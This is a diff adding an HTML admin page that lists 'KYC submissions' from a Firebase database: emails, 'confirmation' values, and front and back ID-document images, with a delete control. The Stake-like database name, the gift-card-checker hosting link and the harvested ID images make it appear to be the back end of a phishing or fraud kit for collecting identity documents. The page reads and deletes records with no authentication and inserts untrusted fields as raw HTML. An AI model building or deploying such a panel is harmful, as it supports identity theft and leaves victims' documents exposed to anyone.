@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin - KYC Submissions</title>
+  <style>
+    body {
+      background-color: #0d0d0d;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      padding: 20px;
+    }
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+    }
+    .submission {
+      border: 1px solid #ff9800;
+      padding: 15px;
+      margin: 15px 0;
+      border-radius: 8px;
+      position: relative;
+    }
+    .submission h3 {
+      color: #ff9800;
+      margin-bottom: 8px;
+    }
+    .submission p {
+      margin: 5px 0;
+    }
+    .submission img {
+      max-width: 200px;
+      margin: 5px;
+      border: 1px solid #fff;
+      border-radius: 4px;
+    }
+    .delete-btn {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background-color: red;
+      color: white;
+      border: none;
+      padding: 8px 12px;
+      cursor: pointer;
+      border-radius: 4px;
+    }
+    .delete-btn:hover {
+      background-color: darkred;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Admin - KYC Submissions</h2> <a href="https://giftcardcheckersall.w3spaces.com/admin.html" >HOME</a>
+    <div id="submissions">Loading submissions...</div>
+  </div>
+
+  <script>
+    const DB_URL = "https://stake-f540f-default-rtdb.firebaseio.com/"; // Replace with your Firebase URL
+
+    async function fetchSubmissions() {
+      try {
+        const response = await fetch(DB_URL + "kycSubmissions.json");
+        const submissions = await response.json();
+        const submissionsDiv = document.getElementById("submissions");
+        submissionsDiv.innerHTML = "";
+
+        if (!submissions) {
+          submissionsDiv.innerHTML = "<p>No submissions found.</p>";
+          return;
+        }
+
+        Object.keys(submissions).forEach(key => {
+          const submission = submissions[key];
+          const submissionDiv = document.createElement("div");
+          submissionDiv.className = "submission";
+          submissionDiv.innerHTML = `
+            <h3>${submission.email || "No Email"}</h3>
+            <p><strong>Confirmation:</strong> ${submission.confirmation || "No Confirmation"}</p>
+            <p><strong>Submitted:</strong> ${new Date(submission.submittedAt).toLocaleString()}</p>
+            <div>
+              <img src="${submission.frontImage}" alt="Front Image">
+              <img src="${submission.backImage}" alt="Back Image">
+            </div>
+            <p><strong>Status:</strong> ${submission.status || "Not Set"}</p>
+            <button class="delete-btn" onclick="deleteSubmission('${key}')">Delete</button>
+          `;
+          submissionsDiv.appendChild(submissionDiv);
+        });
+      } catch (error) {
+        console.error("Error fetching submissions:", error);
+        document.getElementById("submissions").innerText = "Error loading submissions.";
+      }
+    }
+
+    async function deleteSubmission(submissionKey) {
+      if (confirm("Are you sure you want to delete this submission?")) {
+        try {
+          const response = await fetch(DB_URL + `kycSubmissions/${submissionKey}.json`, {
+            method: "DELETE",
+          });
+
+          if (response.ok) {
+            alert("Submission deleted successfully!");
+            fetchSubmissions(); // Refresh the list
+          } else {
+            alert("Failed to delete submission.");
+          }
+        } catch (error) {
+          console.error("Error deleting submission:", error);
+          alert("An error occurred while deleting the submission.");
+        }
+      }
+    }
+
+    // Fetch submissions on page load and refresh every 10 seconds
+    fetchSubmissions();
+    setInterval(fetchSubmissions, 10000);
+  </script>
+</body>
+</html>
